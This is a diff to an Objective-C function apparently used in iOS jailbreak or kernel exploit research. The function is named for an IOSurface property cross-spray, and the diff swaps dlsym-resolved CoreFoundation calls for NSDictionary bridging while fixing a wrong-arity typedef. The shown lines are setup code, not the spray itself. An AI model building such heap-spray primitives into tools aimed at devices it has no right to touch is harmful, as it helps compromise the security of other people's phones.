@@ -41568,10 +41568,10 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
         iosurface_setval_fn sym_surf_setval = (iosurface_setval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
         iosurface_copyval_fn sym_surf_copyval = (iosurface_copyval_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
 
-        typedef void*(*cfdictcreate_fn)(void*, const void**, const void**, long, const void*);
-        typedef void*(*cfnumcreate_fn)(void*, int, const void*);
-        // Note: CFStringCreateWithCString via dlsym conflicts with module declaration in Xcode 26.6
-        // Use NSString bridging instead
+        // CFDictionaryCreate and CFStringCreateWithCString via dlsym cause issues:
+        // - CFDictionaryCreate has 6 params (typedef had 5 — crash)
+        // - CFStringCreateWithCString conflicts with module declaration
+        // Use NSDictionary/NSString bridging instead
         typedef void*(*cfdatacreate_fn)(void*, const uint8_t*, long);
         typedef long(*cfdatalen_fn)(void*);
         typedef const uint8_t*(*cfdataptr_fn)(void*);
@@ -41579,9 +41579,7 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
         typedef long(*cfgettype_fn)(void*);
         typedef long(*cfdatatype_fn)(void);
 
-        cfdictcreate_fn sym_dictcreate = (cfdictcreate_fn)dlsym(RTLD_DEFAULT, "CFDictionaryCreate");
-        cfnumcreate_fn sym_numcreate = (cfnumcreate_fn)dlsym(RTLD_DEFAULT, "CFNumberCreate");
-        // sym_strcreate removed — using (__bridge void*)[NSString stringWithUTF8String:] instead
+        // sym_dictcreate, sym_numcreate, sym_strcreate removed — using NSDictionary/NSString bridging
         cfdatacreate_fn sym_datacreate = (cfdatacreate_fn)dlsym(RTLD_DEFAULT, "CFDataCreate");
         cfdatalen_fn sym_datalen = (cfdatalen_fn)dlsym(RTLD_DEFAULT, "CFDataGetLength");
         cfdataptr_fn sym_dataptr = (cfdataptr_fn)dlsym(RTLD_DEFAULT, "CFDataGetBytePtr");
@@ -41591,7 +41589,7 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
 
         if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async ||
             !sym_surf_create || !sym_surf_getid || !sym_surf_setval || !sym_surf_copyval ||
-            !sym_dictcreate || !sym_numcreate || !sym_datacreate ||
+            !sym_datacreate ||
             !sym_datalen || !sym_dataptr || !sym_cfrelease || !sym_cfgettypeid || !sym_cfdatatypeid) {
             log(@"JB55: FAIL - dlsym missing symbols");
             results[@"verdict"] = @"DLSYM_FAIL";
@@ -41620,23 +41618,15 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
         }
 
         int w = 256, h = 256, bpe = 4;
-        void *wKey = (__bridge void*)@"IOSurfaceWidth";
-        void *hKey = (__bridge void*)@"IOSurfaceHeight";
-        void *bpeKey = (__bridge void*)@"IOSurfaceBytesPerElement";
-        void *allocKey = (__bridge void*)@"IOSurfaceAllocSize";
         int allocSz = w * h * bpe;
-        void *wVal = sym_numcreate(NULL, 9, &w);
-        void *hVal = sym_numcreate(NULL, 9, &h);
-        void *bpeVal = sym_numcreate(NULL, 9, &bpe);
-        void *allocVal = sym_numcreate(NULL, 9, &allocSz);
-        const void *keys[] = {wKey, hKey, bpeKey, allocKey};
-        const void *vals[] = {wVal, hVal, bpeVal, allocVal};
-        void *props = sym_dictcreate(NULL, keys, vals, 4, NULL);
-        void *surface = sym_surf_create(props);
+        NSDictionary *propsDict = @{
+            @"IOSurfaceWidth": @(w),
+            @"IOSurfaceHeight": @(h),
+            @"IOSurfaceBytesPerElement": @(bpe),
+            @"IOSurfaceAllocSize": @(allocSz)
+        };
+        void *surface = sym_surf_create((__bridge void*)propsDict);
         uint32_t surfID = surface ? sym_surf_getid(surface) : 0;
-        sym_cfrelease(props);
-        // wKey, hKey, bpeKey, allocKey are bridged NSStrings — no CFRelease needed
-        sym_cfrelease(wVal); sym_cfrelease(hVal); sym_cfrelease(bpeVal); sym_cfrelease(allocVal);
 
         log([NSString stringWithFormat:@"JB55: IOSurface created surfID=%u", surfID]);
 
